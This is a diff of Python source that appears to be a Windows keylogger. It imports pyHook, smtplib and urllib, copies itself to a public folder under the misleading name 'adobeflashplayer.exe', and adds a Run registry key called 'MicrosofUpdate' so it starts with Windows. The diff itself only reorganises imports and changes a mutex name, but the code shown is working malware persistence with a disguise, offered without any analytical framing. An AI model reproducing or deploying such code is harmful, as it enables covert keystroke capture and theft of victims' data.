@@ -1,9 +1,6 @@
-import pythoncom
-import pyHook
+import pythoncom, pyHook
 from os import path
 from sys import exit
-from sys import argv
-from shutil import copy
 import threading
 import urllib,urllib2
 import smtplib
@@ -11,8 +8,10 @@ import datetime,time
 import win32com.client
 import win32event, win32api, winerror
 from _winreg import *
+import shutil
+import sys
 
-mutex = win32event.CreateMutex(None, 1, 'N0tAs519ns')
+mutex = win32event.CreateMutex(None, 1, 'N0tAs519n')
 if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
     mutex = None
     print "err"
@@ -24,7 +23,7 @@ count=0
 dir = "C:\\Users\\Public\\Libraries\\adobeflashplayer.exe"
 
 def startup():
-    copy(argv[0],dir)
+    shutil.copy(sys.argv[0],dir)
     aReg = ConnectRegistry(None,HKEY_CURRENT_USER)
     aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
     SetValueEx(aKey,"MicrosofUpdate",0, REG_SZ, dir)	
